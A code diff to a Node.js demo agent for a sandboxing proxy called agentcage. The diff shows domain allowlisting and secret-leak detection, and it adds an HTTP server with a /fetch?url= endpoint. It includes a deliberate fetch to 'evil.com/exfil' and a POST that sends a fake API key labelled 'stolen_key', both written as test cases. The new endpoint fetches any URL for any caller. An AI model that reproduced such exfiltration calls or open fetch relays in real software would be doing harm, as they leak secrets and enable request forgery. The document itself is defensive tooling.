@@ -1,52 +1,54 @@
 // Minimal agent that demonstrates agentcage proxy behavior.
-// No real API key needed — uses httpbin.org to show allowed/blocked requests
-// and secret leak detection.
+// Exposes an HTTP server on port 3000 with endpoints to exercise
+// domain filtering and secret leak detection interactively.
+// No real API key needed — uses httpbin.org as the upstream.
 
+const http = require("http");
+
+const PORT = 3000;
 const FAKE_SECRET = "sk-ant-FAKE01-abcdefghijklmnopqrstuvwxyz";
 
-async function main() {
-  console.log("agentcage basic example agent");
+// --- Demo cycle (runs on startup + every 60s for log output) ---
+
+async function demoCycle() {
+  console.log("--- demo cycle ---");
   console.log(`HTTP_PROXY=${process.env.HTTP_PROXY}`);
   console.log(`HTTPS_PROXY=${process.env.HTTPS_PROXY}`);
   console.log();
 
-  // 1. Allowed request — httpbin.org is in the allowlist
+  // 1. Allowed request
   console.log("[1] GET httpbin.org/get (allowed domain)...");
   try {
     const res = await fetch("http://httpbin.org/get");
     console.log(`  HTTP ${res.status}`);
-    const body = JSON.parse(await res.text());
-    console.log(`  Origin: ${body.origin}`);
   } catch (err) {
     console.log(`  ERROR: ${err.message}`);
   }
 
-  // 2. Blocked request — evil.com is not in the allowlist
-  console.log("\n[2] GET evil.com (blocked domain)...");
+  // 2. Blocked request
+  console.log("[2] GET evil.com (blocked domain)...");
   try {
     const res = await fetch("http://evil.com/exfil");
-    const body = await res.text();
-    console.log(`  HTTP ${res.status}: ${body.slice(0, 100)}`);
+    console.log(`  HTTP ${res.status}`);
   } catch (err) {
     console.log(`  BLOCKED: ${err.message}`);
   }
 
-  // 3. Secret leak detection — posting a fake API key to an allowed domain
-  console.log("\n[3] POST secret to httpbin.org (leak detection)...");
+  // 3. Secret leak detection
+  console.log("[3] POST secret to httpbin.org (leak detection)...");
   try {
     const res = await fetch("http://httpbin.org/post", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ stolen_key: FAKE_SECRET }),
     });
-    const body = await res.text();
-    console.log(`  HTTP ${res.status}: ${body.slice(0, 100)}`);
+    console.log(`  HTTP ${res.status}`);
   } catch (err) {
     console.log(`  BLOCKED: ${err.message}`);
   }
 
-  // 4. Clean POST to allowed domain — should succeed
-  console.log("\n[4] POST clean data to httpbin.org (allowed)...");
+  // 4. Clean POST
+  console.log("[4] POST clean data to httpbin.org (allowed)...");
   try {
     const res = await fetch("http://httpbin.org/post", {
       method: "POST",
@@ -58,16 +60,106 @@ async function main() {
     console.log(`  ERROR: ${err.message}`);
   }
 
-  console.log("\nAll tests complete. Agent staying alive (Ctrl+C or cage destroy to stop).\n");
+  console.log("--- demo cycle complete ---\n");
 }
 
-async function loop() {
-  await main();
-  // Re-run every 60s so the cage stays up for verify/inspect
-  setInterval(async () => {
-    console.log("--- re-running tests ---\n");
-    await main();
-  }, 60_000);
+// --- HTTP server ---
+
+function readBody(req) {
+  return new Promise((resolve, reject) => {
+    const chunks = [];
+    req.on("data", (c) => chunks.push(c));
+    req.on("end", () => resolve(Buffer.concat(chunks).toString()));
+    req.on("error", reject);
+  });
 }
 
-loop();
+function json(res, status, obj) {
+  const body = JSON.stringify(obj, null, 2);
+  res.writeHead(status, {
+    "Content-Type": "application/json",
+    "Content-Length": Buffer.byteLength(body),
+  });
+  res.end(body);
+}
+
+async function handleRoot(_req, res) {
+  json(res, 200, {
+    service: "agentcage basic example",
+    http_proxy: process.env.HTTP_PROXY || null,
+    https_proxy: process.env.HTTPS_PROXY || null,
+    endpoints: [
+      "GET  /                  — this health check",
+      "GET  /fetch?url=<url>   — proxy a fetch to <url>",
+      "POST /check-secret      — forward body to httpbin.org/post",
+    ],
+  });
+}
+
+async function handleFetch(req, res) {
+  const u = new URL(req.url, `http://${req.headers.host}`);
+  const target = u.searchParams.get("url");
+  if (!target) {
+    return json(res, 400, { error: "missing ?url= parameter" });
+  }
+
+  try {
+    const upstream = await fetch(target);
+    const body = await upstream.text();
+    json(res, upstream.status, {
+      upstream_status: upstream.status,
+      body_length: body.length,
+      body_preview: body.slice(0, 512),
+    });
+  } catch (err) {
+    json(res, 502, { error: err.message });
+  }
+}
+
+async function handleCheckSecret(req, res) {
+  const body = await readBody(req);
+
+  try {
+    const upstream = await fetch("http://httpbin.org/post", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body,
+    });
+    const text = await upstream.text();
+    json(res, upstream.status, {
+      upstream_status: upstream.status,
+      body_length: text.length,
+      body_preview: text.slice(0, 512),
+    });
+  } catch (err) {
+    json(res, 502, { error: err.message });
+  }
+}
+
+const server = http.createServer(async (req, res) => {
+  const u = new URL(req.url, `http://${req.headers.host}`);
+
+  try {
+    if (req.method === "GET" && u.pathname === "/") {
+      await handleRoot(req, res);
+    } else if (req.method === "GET" && u.pathname === "/fetch") {
+      await handleFetch(req, res);
+    } else if (req.method === "POST" && u.pathname === "/check-secret") {
+      await handleCheckSecret(req, res);
+    } else {
+      json(res, 404, { error: "not found" });
+    }
+  } catch (err) {
+    console.error(`Error handling ${req.method} ${req.url}:`, err);
+    if (!res.headersSent) {
+      json(res, 500, { error: "internal server error" });
+    }
+  }
+});
+
+server.listen(PORT, "0.0.0.0", () => {
+  console.log(`agentcage basic example listening on 0.0.0.0:${PORT}`);
+  // Run demo cycle on startup, then every 60s
+  demoCycle();
+  setInterval(demoCycle, 60_000);
+});
